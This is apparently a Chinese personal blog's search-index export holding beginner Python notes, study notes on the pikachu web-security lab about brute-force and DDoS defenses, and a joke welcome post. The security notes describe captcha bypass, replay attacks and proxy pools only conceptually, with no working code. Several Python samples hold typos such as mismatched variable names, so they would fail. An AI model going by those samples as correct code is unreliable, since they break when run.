class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">·message = hello world</span><br><span class="line">·print(&quot;message&quot;)</span><br><span class="line">·message = goodbye world</span><br><span class="line"> ·print(&quot;message&quot;)</span><br></pre></td></tr></table></figure><p>这样の话就会打印输出两行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br><span class="line">goodbye world</span><br></pre></td></tr></table></figure><p>在程序中可以随时修改变量の值，但是python将始终记录变相の最新值</p><h6 id="变量的使用和命名原则"><a href="#变量的使用和命名原则" class="headerlink" title="变量的使用和命名原则"></a>变量的使用和命名原则</h6><p>变量的使用，需要遵循一些原则</p><blockquote><p>变量名只能包含数字，下划线，字母。变量名只能以字母或者下划线打头，但不能以数字打头。</p><p>例如：</p><p>你可以以message_1为变量名，但是你不可以以1_message为变量名</p><p>变量名不可以是空格，需要用到的时候以下划线来分割其中的单词</p><p>例如：</p><p>message_1是可以的，但是message 1是不可行的</p><p>有些Python关键字和函数名是不鞥用作变量名的，查询的话是使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import keyword</span><br><span class="line">print(keyword.kwlist)</span><br><span class="line">print(len(keyword.kwlist))</span><br></pre></td></tr></table></figure></blockquote><h6 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h6><p>字符串就是一连串的字符。在Pyhthon中，用括号括起来的都是字符串，</p><p>“this is a string”</p><p>‘this is also a string’</p><h6 id="方法：Python对数据进行的操作"><a href="#方法：Python对数据进行的操作" class="headerlink" title="方法：Python对数据进行的操作"></a>方法：Python对数据进行的操作</h6><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = &quot;anaconda&quot;</span><br><span class="line">print(name.title())</span><br></pre></td></tr></table></figure><p>这个语句的输出就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anaconda</span><br></pre></td></tr></table></figure><p>其中title()就是方法，而name后面的.就是让Pyhon对变量name执行方法title（）指定的操作</p><p>方法title()已首字母大写的方式显示每个单词，即将每个单词的首字母都大写（所以叫title标题么）</p><p>此外还有几个大小写处理方法</p><p>.upper()全字母大写</p><p>.lower()全字母小写</p><p>在字符串中使用变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">first_name = &quot;ada&quot;</span><br><span class="line">lase_name = &quot;lovelace&quot;</span><br><span class="line">full_name = f&quot;&#123;first_name&#125;&#123;last_name&#125;&quot;</span><br><span class="line">print(full_name)</span><br></pre></td></tr></table></figure><p>要在字符串中插入变量的值，可在牵引号前加入字母f，再将要插入的变量放在花括号内。这种字符串称之为f（format）字符串</p><p>上述代码输出结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ada lovelace</span><br></pre></td></tr></table></figure><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">first_name = &quot;ada&quot;</span><br><span class="line">lase_name = &quot;lovelace&quot;</span><br><span class="line">full_name = f&quot;&#123;first_name&#125;&#123;last_name&#125;&quot;</span><br><span class="line">print(f&quot;hello,&#123;full_name.title()&#125;!&quot;)</span><br></pre></td></tr></table></figure><p>上述语句会变成一段友好的问候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello,Ada Lovelace!</span><br></pre></td></tr></table></figure><p>当然，还可以将整个这一段赋值给一个变量，zheyangdehuazuihouzaiprint调用的话时候会简单很多</p><h6 id="制表符或者换行符来添加空白"><a href="#制表符或者换行符来添加空白" class="headerlink" title="制表符或者换行符来添加空白"></a>制表符或者换行符来添加空白</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;language:\n\ttPyhton\n\tC\n\tJavaScript&quot;)</span><br><span class="line">输出结果如下</span><br><span class="line">language:</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">JavaScript</span><br></pre></td></tr></table></figure><h6 id="删除空白"><a href="#删除空白" class="headerlink" title="删除空白"></a>删除空白</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;favorite_language = &quot;Pyhotn &quot;</span><br><span class="line">&gt;&gt;&gt;favorite_language</span><br><span class="line">”python “</span><br><span class="line">&gt;&gt;&gt;favorite_language = &quot;Pyhotn &quot;</span><br><span class="line">&gt;&gt;&gt;favorite_language.rstrip()</span><br><span class="line">”python“</span><br></pre></td></tr></table></figure><p>但是这种删除只是短暂的，当你再次访问这个favorite_language的变量的值的时候，可看见末尾的空格。</p><p>要永久的删除这个地方的空白，就要将删除操作的结果关联到变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;favorite_language = &quot;Pyhotn &quot;</span><br><span class="line">&gt;&gt;&gt;favorite_language = favorite_language.rstrip()</span><br><span class="line">&gt;&gt;&gt;favorite_language</span><br><span class="line">&quot;python&quot;</span><br></pre></td></tr></table></figure><p>当然，你还可以删除开头的空白</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;favorite_language = &quot; Pyhotn &quot;</span><br><span class="line">》》》favorite_language.lstrip()</span><br><span class="line">&quot;Python &quot;</span><br></pre></td></tr></table></figure><h6 id="使用字符串的时候要避免语法错误"><a href="#使用字符串的时候要避免语法错误" class="headerlink" title="使用字符串的时候要避免语法错误"></a>使用字符串的时候要避免语法错误</h6><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = &#x27;Python&#x27;s strength is its diverse community&#x27;</span><br></pre></td></tr></table></figure><p>这是一个错误的，单引号之内不能有单引号，但是双引号可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = “Python&#x27;s strength is its diverse community”</span><br></pre></td></tr></table></figure><p>整数Int浮点数float也和C语言一样，这里就不多说了</p><p>有一点，整数不管怎么和浮点数运算，结果永远是浮点数。</p><p>书写很大的整数的时候，可以用_来进行分割，当你打印这种使用下划线定义的数的时候，Python不会打印其中的下划线</p><h6 id="同时给过个变量赋值"><a href="#同时给过个变量赋值" class="headerlink" title="同时给过个变量赋值"></a>同时给过个变量赋值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x,y,z=0,1,2</span><br></pre></td></tr></table></figure><p>这样的话x=0,y=1,z=2</p><p>同时复制的话记得中间用,隔开就行</p><p>在python中，要指出特定的变量为常亮可已将其全部大写，方便辨认。</p><h6 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h6><p>#跟C语言的/一样性质</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu---爆破</title>
      <link href="/2023/03/19/pikachu---%E7%88%86%E7%A0%B4/"/>
      <url>/2023/03/19/pikachu---%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<p><a href="https://note.youdao.com/s/AmDlcdeg">https://note.youdao.com/s/AmDlcdeg</a></p><p>pikachu验证码绕过</p><p><a href="https://note.youdao.com/s/cCN1K9ys">https://note.youdao.com/s/cCN1K9ys</a></p><p>pikachu验证码绕过（on cilent）</p><p><a href="https://note.youdao.com/s/DSGjveVc">https://note.youdao.com/s/DSGjveVc</a></p><p>pikachu中token防爆破</p><h3 id="Web登录防爆破的原理和实现"><a href="#Web登录防爆破的原理和实现" class="headerlink" title="Web登录防爆破的原理和实现"></a>Web登录防爆破的原理和实现</h3><p><a href="https://www.cnblogs.com/cx59244405/p/10410746.html">https://www.cnblogs.com/cx59244405/p/10410746.html</a></p><h5 id="ddos攻击：一般指分布式拒绝服务攻击"><a href="#ddos攻击：一般指分布式拒绝服务攻击" class="headerlink" title="ddos攻击：一般指分布式拒绝服务攻击"></a>ddos攻击：一般指分布式拒绝服务攻击</h5><blockquote><p>一.基于自动化程序分类</p><p>1.手工的DDoS攻击：早期的DDoS攻击全是采用手动配置的，即发动DDoS攻击时，扫描远端有漏洞的计算机，侵入他们并安装代码</p><p>2.半自动化的DDoS攻击:攻击者使用自动化的Script来扫描，主控端的机器对主控端和代理端之间进行协商攻击的类型、受害者的地址、何时发起攻击等信息由进行详细记录。</p><p>3、自动化的DDoS攻击。</p><p>在这类攻击中。攻击者和代理端机器之间的通信是绝对不允许的。这类攻击的攻击阶段绝大部分被限制用一个单一的命令来实现，攻击的所有特征，例如攻击的类型，持续的时间和受害者的地址在攻击代码中都预先用程序实现。 [4] </p><p>二、基于系统及协议的弱点分类</p><p>1、洪水攻击。</p><p>在<a href="https://baike.baidu.com/item/%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8826972?fromModule=lemma_inlink">洪水攻击</a>中。傀儡机向受害者系统发送大量的数据流为了充塞受害者系统的带宽，影响小的则降低受害者提供的服务，影响大的则使整个网络带宽持续饱和，以至于网络服务瘫痪。典型的洪水攻击有UDP洪水攻击和ICMP洪水攻击。 [4] </p><p>2、扩大攻击。</p><p>扩大攻击分为两种，一种是利用广播lP地址的特性，一种是利用反射体来发动攻击。前一种攻击者是利用了广播IP地址的特性来扩大和映射攻击，导致路由器将数据包发送到整个网络的广播地址列表中的所有的广播IP地址。这些恶意的流量将减少受害者系统可提供的带宽。典型的扩大攻击有Smurf和Fraggle攻击。 [4] </p><p>3、利用协议的攻击。</p><p>该类攻击则是利用某些协议的特性或者利用了安装在受害者机器上的协议中存在的漏洞来耗尽它的大量资源。典型的利用协议攻击的例子是TCP SYN攻击。 [4] </p><p>4、畸形数据包攻击。</p><p>攻击者通过向受害者发送不正确的IP地址的数据包，导致受害系统崩溃。畸形数据包攻击可分为两种类型：IP地址攻击和IP数据包属性攻击。 [4] </p><p>三、基于攻击速率分类</p><p>DDoS攻击从基于速率上进行分类，可以分为持续速率和可变速率的攻击。持续速率的攻击是指只要开始发起攻击，就用全力不停顿也不消减力量。像这种攻击的影响是非常快的。可变速率的攻击，从名字就可以看出，用不同的攻击速率，基于这种速率改变的机制，可以把这种攻击分为增加速率和波动的速率。 [4] </p><p>四、基于影响力进行分类</p><p>DDoS攻击从基于影响力方面可以分为网络服务彻底崩溃和降低网络服务的攻击。服务彻底崩溃的攻击将导致受害者的服务器完全拒绝对客户端提供服务。降低网络服务的攻击，消耗受害者系统的一部分资源，这将延迟攻击被发现的时间，同时对受害者造成一定的破坏。 [4] </p><p>五、基于入侵目标分类</p><p>DDoS攻击从基于入侵目标，可以将DDoS攻击分为带宽攻击和连通性攻击，带宽攻击通过使用大量的数据包来淹没整个网络，使得有效的网络资源被浪费，合法用户的请求得不到响应，大大降低了效率。而连通性攻击是通过发送大量的请求来使得计算机瘫痪，所有有效的操作系统资源被耗尽，导致计算机不能够再处理合法的用户请求。 [4] </p><p>六、基于攻击路线分类</p><p>1、直接攻击：攻击者和主控端通信，主控端接到攻击者的命令后，再控制代理端向受害者发动攻击数据流。代理端向受害者系统发送大量的伪IP地址的网络数据流，这样攻击者很难被追查到。 [4] </p><p>2、反复式攻击通过利用反射体，发动更强大的攻击流。<a href="https://baike.baidu.com/item/%E5%8F%8D%E5%B0%84%E4%BD%93/1614339?fromModule=lemma_inlink">反射体</a>是任何一台主机只要发送一个数据包就能收到一个数据包，反复式攻击就是攻击者利用中间的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%8A%82%E7%82%B9/9338583?fromModule=lemma_inlink">网络节点</a>发动攻击。 [4] </p><p>七、基于攻击特征分类</p><p>从攻击特征的角度，可以将DDoS攻击分为攻击行为特征可提取和攻击行为特征不可提取两类。攻击行为特征可提取的DDoS攻击又可以细分为可过滤型和不可过滤型。可过滤型的DDoS攻击主要指那些使用畸形的非法数据包。不可过滤型DDoS攻击通过使用精心设计的数据包，模仿合法用户的正常请求所用的数据包，一旦这类数据包被过滤将会影响合法用户的正常使用。 [4]</p></blockquote><p>以上来自百度百科（没想到吧哈哈哈哈<img src="https://img2.baidu.com/it/u=3863236755,305052694&fm=253&fmt=auto&app=138&f=JPEG?w=300&h=300" alt="img">)</p><h6 id="DDoS的工作原理"><a href="#DDoS的工作原理" class="headerlink" title="DDoS的工作原理"></a>DDoS的工作原理</h6><p>在DDoS共计期间，一系列机器人活着僵尸网络会用HTTP请求和流量攻占网站或服务。从本质上来讲，在攻击期间会有多台计算机攻击一台计算机，导致将合法用户推出。因此网络可能会延迟或中断一段时间。</p><p>在共计期间，黑客可能会深入数据库以访问各种敏感信息。DDoS攻击可以利用安全漏洞冰攻击可通过Internet公开访问的任何终结点。</p><p>拒绝服务攻击可能会持续几小时，甚至几天。这些网络攻击还可能在一次攻击中造成多项破坏。个人和企业设备都容易受到此类攻击。</p><h4 id="1-防护软件-硬件Waf-Web应用防火墙-Web服务器限制单IP固定时间段的登陆频率"><a href="#1-防护软件-硬件Waf-Web应用防火墙-Web服务器限制单IP固定时间段的登陆频率" class="headerlink" title="1.防护软件/硬件Waf(Web应用防火墙)/Web服务器限制单IP固定时间段的登陆频率"></a>1.防护软件/硬件Waf(Web应用防火墙)/Web服务器限制单IP固定时间段的登陆频率</h4><ul><li>所以可以使用WAF来实现对某个IP访问过高时将其IP加入黑名单隔离</li><li>通过Nginx等web服务器可以实现限制单IP固定时间段的登录频率，也就是限制流量</li><li>可以防爆破的同时一定程度上防止DDoS攻击</li></ul><h6 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.runoob.com/w3cnote/nginx-setup-intro.html</span><br></pre></td></tr></table></figure><p>但是这样也有问题，攻击者可以通过代理池的方式绕过</p><p>代理池：一组受管理的代理，代理池充当计算机和网络之间的中介，将请求路由到网站并显示自己的IP地址，同时隐藏自己的IP</p><ul><li>（因为代理池中有很多的IP地址，相当于你连接到代理池，再从代理池换了一个IP连接到你所要去的网站）</li></ul><h4 id="2-WebApp限制单用户固定时间段的登录频率"><a href="#2-WebApp限制单用户固定时间段的登录频率" class="headerlink" title="2.WebApp限制单用户固定时间段的登录频率"></a>2.WebApp限制单用户固定时间段的登录频率</h4><p>就跟手机密码试错一样，错误几次以上就锁账号，能一定程度上的防止</p><p>但这样也有问题，可以故意使用错误密码使得原来的用户也不能登陆</p><h5 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h5><p>又称之为重播攻击，是指攻击者发送一个目的主机已接收过得包来达到欺骗系统的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实他的意思就是攻击者把服务器收到过的数据包反复请求，由于是已经拒收岛国的数据包，如果服务器防范不当的话接口可以通过身份验证，就跟pikachu的验证码绕过一样，重发的包是服务器接受过的，而且验证码还没变，所以可以通过爆破账号密码来进行攻击</span><br></pre></td></tr></table></figure><h4 id="3-图片验证码（扭曲-干扰-数字-字母-阴影-随机颜色）"><a href="#3-图片验证码（扭曲-干扰-数字-字母-阴影-随机颜色）" class="headerlink" title="3.图片验证码（扭曲+干扰+数字+字母+阴影+随机颜色）"></a>3.图片验证码（扭曲+干扰+数字+字母+阴影+随机颜色）</h4><p>我相信各位登录王网站的时候肯定会输入过一些验证码，像是这样的</p><p><img src="https://s2.loli.net/2023/03/21/3jRAkKbfhrN2pO6.gif" alt="44770e5bc70fa816a0df9da07816e28c.gif"></p><p>这样是为了防止重放攻击</p><p><em>但是这样的问题就是验证码不能放在session中，因为重放攻击每次的session都不变，去session中核对验证码每次都是不变的</em></p><h5 id="session-PHP语言"><a href="#session-PHP语言" class="headerlink" title="session,PHP语言"></a>session,PHP语言</h5><blockquote><p>string <strong>session_cache_limiter</strong> ( [string cache_limiter]) 函数返回当前缓存限制的名字. 如果指定了 cache_limiter， 当前的缓存限制的名字被改为新值。</p></blockquote><p>​                                                ———————-来自百度百科</p><p>但实际上吧，session和cookie功能其实差不多，他们的区别在于session记录在服务器，cookie记录在客户端</p><p>session就是在服务器内开辟一块内存，这个session只允许当前服务器使用，即使是新开了一个服务器也无法使用当前这个session</p><p>（硬要说的话，就像是你通过steam要买一个游戏，你在购物车选好以后要跳付款界面，没有session的话付款界面怎么知道你要付的款项呢（如果不想知道的话我感觉表票也不是不能接受））</p><p>那问题来了，浏览器怎么知道你应该付的是这个款项而不是其他的呢，比如你买一个永劫，但给你跳转了一个尼尔机械纪元的钱，这不血亏。（反过来我倒是可以小小的将就一下（&lt;^__^&gt;）</p><p>其实这种情况是不可能出现的，当访问一个页面的时候，会给服务器一个unique的号码，而这个号码也会同时共享给session,当访问第二个页面的时候，会将这个号码同步传递到第二个页面。</p><p>4.IP段黑白名单</p><p>就是Ban了某些IP</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello</title>
      <link href="/2023/03/18/hello-world/"/>
      <url>/2023/03/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>hello，来访者，你好啊，欢迎来到卖律者の咸鱼摊，我们这里提供各种各样の律者，欢迎选购哦~<br>订餐电话：**********<br>地址：*************</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hello </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
